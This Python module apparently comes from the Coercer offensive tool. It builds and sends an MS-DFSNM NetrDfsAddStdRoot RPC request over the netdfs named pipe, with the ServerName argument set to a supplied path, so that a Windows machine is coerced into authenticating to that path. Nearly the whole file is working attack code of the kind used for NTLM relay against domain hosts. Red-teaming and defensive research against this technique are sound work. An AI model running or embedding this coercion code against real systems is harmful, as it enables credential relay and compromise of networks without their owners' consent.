#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : NetrDfsAddStdRoot.py
# Author             : Podalirius (@podalirius_)
# Date created       : 14 Sep 2022

from coercer.core.utils import gen_random_name
from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
from coercer.network.DCERPCSessionError import DCERPCSessionError
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID


class _NetrDfsAddStdRoot(NDRCALL):
    """
    Structure to make the RPC call to NetrDfsAddStdRoot() in MS-DFSNM Protocol
    """
    opnum = 12
    structure = (
        ('ServerName', WSTR),  # Type: WCHAR *
        ('RootShare', WSTR),   # Type: WCHAR *
        ('Comment', WSTR),     # Type: WCHAR *
        ('ApiFlags', DWORD),   # Type: DWORD
    )


class _NetrDfsAddStdRootResponse(NDRCALL):
    """
    Structure to parse the response of the RPC call to NetrDfsAddStdRoot() in MS-DFSNM Protocol
    """
    structure = ()


class NetrDfsAddStdRoot(MSPROTOCOLRPCCALL):
    """
    Coercing a machine to authenticate using function NetrDfsAddStdRoot (opnum 12) of [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)

    Method found by:
     - [@filip_dragovic](https://twitter.com/filip_dragovic)
    """

    access = {
        "ncan_np": [
            {
                "namedpipe": r"\PIPE\netdfs",
                "uuid": "4fc742e0-4a10-11cf-8273-00aa004ae673",
                "version": "3.0"
            }
        ]
    }

    protocol = {
        "longname": "[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol",
        "shortname": "MS-DFSNM"
    }

    function = {
        "name": "NetrDfsAddStdRoot",
        "opnum": 12,
        "vulnerable_arguments": ["ServerName"]
    }

    def trigger(self, dcerpc_session):
        if dcerpc_session is not None:
            try:
                request = _NetrDfsAddStdRoot()
                request['ServerName'] = self.path
                request['RootShare'] = gen_random_name() + '\x00'
                request['Comment'] = gen_random_name() + '\x00'
                request['ApiFlags'] = 0
                resp = dcerpc_session.request(request)
                return ""
            except Exception as err:
                return err
        else:
            print("[!] Error: dce is None, you must call connect() first.")
            return None
